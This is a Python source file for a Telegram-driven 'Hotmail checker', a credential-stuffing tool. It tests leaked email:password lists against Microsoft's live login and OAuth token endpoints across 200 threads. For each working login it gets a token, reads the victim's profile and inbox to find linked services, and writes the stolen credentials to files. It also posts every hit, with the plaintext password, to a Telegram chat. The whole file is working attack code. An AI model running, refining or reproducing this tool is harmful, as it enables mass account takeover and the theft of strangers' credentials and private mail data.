import os
import sys
import time
import uuid
import pycountry
import requests
import threading
import concurrent.futures
import random
import re
from threading import Lock

lock = Lock()

class HotmailChecker:
    def __init__(self, bot, chat_id, services):
        self.bot = bot
        self.chat_id = chat_id
        self.services = services
        self.hit = 0
        self.bad = 0
        self.retry = 0
        self.processed = 0
        self.total_combos = 0
        self.linked_accounts = {}
        self.checked_accounts = set()
        self.rate_limit = threading.BoundedSemaphore(500)
        self.progress_message_id = None

    def send_message(self, text, parse_mode='HTML'):
        try:
            self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode)
        except Exception as e:
            print(f"[SEND ERROR] {e}")

    def create_progress_bar(self, percentage, length=25):
        filled = int(length * percentage / 100)
        bar = "█" * filled + "░" * (length - filled)
        return f"[{bar}] {percentage:.1f}%"

    def update_progress(self):
        print("[INFO] Progress thread started")
        while self.processed < self.total_combos and self.total_combos > 0:
            with lock:
                pct = min((self.processed / self.total_combos * 100), 100) if self.total_combos > 0 else 0
                bar = self.create_progress_bar(pct)
                linked = sum(self.linked_accounts.values())
                msg = f"""
🔄 <b>SCANNING</b>
{bar}

📊 {self.processed}/{self.total_combos}
✅ HIT: {self.hit}
❌ BAD: {self.bad}
🔄 RETRY: {self.retry}
🔗 LINKED: {linked}
"""
            try:
                if self.progress_message_id:
                    self.bot.edit_message_text(chat_id=self.chat_id, message_id=self.progress_message_id, text=msg, parse_mode='HTML')
                else:
                    sent = self.bot.send_message(chat_id=self.chat_id, text=msg, parse_mode='HTML')
                    self.progress_message_id = sent.message_id
            except Exception as e:
                print(f"[Progress Error] {e}")
            time.sleep(5)

    def get_flag(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
        except:
            return '🏳'

    def save_account(self, service_name, email, password):
        if service_name in self.services:
            if not os.path.exists("Accounts"):
                os.makedirs("Accounts")
            filename = os.path.join("Accounts", self.services[service_name]["file"])
            account_line = f"{email}:{password}\n"
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8') as f:
                    if account_line in f.readlines():
                        return
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(account_line)
            with lock:
                self.linked_accounts[service_name] = self.linked_accounts.get(service_name, 0) + 1

    def get_capture(self, email, password, token, cid):
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}"
            }
            response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=25).json()
            name = response.get('names', [{}])[0].get('displayName', 'Unknown')
            country = response.get('accounts', [{}])[0].get('location', 'Unknown')
            flag = self.get_flag(country)

            # Inbox check
            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            inbox_headers = {
                "Host": "outlook.live.com",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                "x-owa-sessionid": cid
            }
            inbox_response = requests.post(url, headers=inbox_headers, data="", timeout=25).text

            linked_services = []
            for service_name, info in self.services.items():
                if info["sender"] in inbox_response:
                    linked_services.append(f"✔ {service_name}")
                    self.save_account(service_name, email, password)

            linked_str = "\n".join(linked_services) if linked_services else "No linked services found"

            capture = f"""
🔱 HOTMAİL HÍT BULUNDU 🔱
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
📧 Email: {email}
🔑 Password: {password}
👤 Name: {name}
🌍 Country: {flag} {country}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
🔗 EMAIL IN INBOX:
{linked_str}

📊 Toplam Hit: {self.hit + 1}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT
"""
            self.send_message(capture.strip())
            with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
                f.write(capture + "\n" + "="*60 + "\n")

            with lock:
                self.hit += 1
                self.processed += 1
        except Exception as e:
            print(f"[Capture Error] {e}")
            with lock:
                self.processed += 1

    def check_account(self, email, password):
        try:
            session = requests.Session()
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                return {"status": "BAD"}

            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
            r3 = session.post(post_url, data=login_data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }, allow_redirects=False, timeout=15)

            if any(x in r3.text.lower() for x in ["incorrect", "invalid", "error"]):
                return {"status": "BAD"}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}

            code = code_match.group(1)
            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)

            if r4.status_code != 200 or "access_token" not in r4.text:
                return {"status": "BAD"}

            access_token = r4.json()["access_token"]
            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value
                    break
            cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
            return {"status": "HIT", "token": access_token, "cid": cid}
        except requests.exceptions.Timeout:
            return {"status": "RETRY"}
        except Exception as e:
            print(f"[Check Error] {e}")
            return {"status": "RETRY"}

    def check_combo(self, email, password):
        account_id = f"{email}:{password}"
        if account_id in self.checked_accounts:
            with lock:
                self.processed += 1
            return
        self.checked_accounts.add(account_id)

        with self.rate_limit:
            time.sleep(random.uniform(0.01, 0.05))
            result = self.check_account(email, password)
            with lock:
                if result.get("status") == "HIT":
                    self.get_capture(email, password, result.get("token"), result.get("cid"))
                elif result.get("status") == "BAD":
                    self.bad += 1
                else:
                    self.retry += 1
                self.processed += 1

    def run(self, threads=200):
        print(f"[INFO] Checker started with {threads} threads")
        try:
            with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if ":" in line]
            self.total_combos = len(lines)

            if self.total_combos == 0:
                self.send_message("❌ No valid combos found!")
                return

            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting check with 200 threads...")

            progress_thread = threading.Thread(target=self.update_progress, daemon=True)
            progress_thread.start()

            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                for line in lines:
                    try:
                        email, pw = line.split(":", 1)
                        executor.submit(self.check_combo, email.strip(), pw.strip())
                    except:
                        continue

            time.sleep(5)
            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit} | Bad: {self.bad} | Retries: {self.retry}")
        except Exception as e:
            print(f"[Checker Run Error] {e}")
            self.send_message("❌ Checker crashed. Check logs.")